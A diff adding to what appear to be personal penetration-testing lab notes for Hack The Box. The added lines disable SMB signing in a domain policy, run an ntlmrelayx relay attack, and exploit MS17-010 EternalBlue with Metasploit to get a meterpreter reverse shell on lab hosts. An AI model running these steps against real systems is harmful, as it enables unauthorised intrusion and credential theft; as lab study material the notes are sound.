@@ -324,3 +324,45 @@ set smbpass $USERHASH
 run
 set target 2 #if the previous one does not work
 run
+
+#go to a windows server
+#search for gpmc in the file browser and click on it
+#right click on Default Domain Policy
+#Select "Edit"
+#Expand "Policies"
+#Expand "Windows Settings"
+#Expand "Security Settings"
+#Expand "Local Policies"
+#Select "Security Options"
+#Disable "Microsoft network client: Digitally sign communications"
+
+#just some random commands
+locate ntlmrelayx.py
+python ntlmrelayx.py -tf target.txt -smb2support
+
+
+#BLUE MS17-010
+Go and search for blue in HTB and Active for scanning
+nmap -A -T4 -p- 10.10.10.40
+#Active
+nmap -A -T4 -p- 10.10.10.100
+nmap -Pn -p445 --script=smb-vuln-ms17-010 10.10.10.40
+#run metasploit
+#then run
+search ms17-010
+#get the location of eternal blue you have in the output to run the next command
+use exploit/windows/smb/ms17_010_eternalblue
+options
+set rhosts 10.10.10.40
+run
+#if it puts you into a windows shell i.e C:\Windows\system32
+whoami
+ctrl C
+y
+options
+show payloads
+#use 64bits
+set payload windows/x64/meterpreter/ #double tab to see options (reverse_tcp) seems like the best
+set payload windows/x64/meterpreter/reverse_tcp
+run
+sysinfo
